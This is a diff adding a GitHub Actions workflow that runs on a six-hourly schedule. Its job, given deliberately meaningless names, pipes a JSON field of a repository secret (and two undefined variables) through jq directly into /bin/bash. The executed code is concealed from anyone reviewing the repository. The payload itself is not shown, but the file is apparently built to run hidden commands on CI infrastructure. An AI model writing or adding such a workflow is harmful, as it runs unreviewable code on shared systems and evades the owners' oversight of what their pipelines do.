@@ -1,0 +1,19 @@
+name: qudailiyu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qudailiyu
+        env:
+          or96: ${{ secrets.or96 }}
+        run: |
+          echo $or96 | jq -r .d5616 | /bin/bash
+          echo $depd79833 | jq -r .sll40 | /bin/bash
+          echo $xgwkw03 | jq -r .nl486 | /bin/bash
+
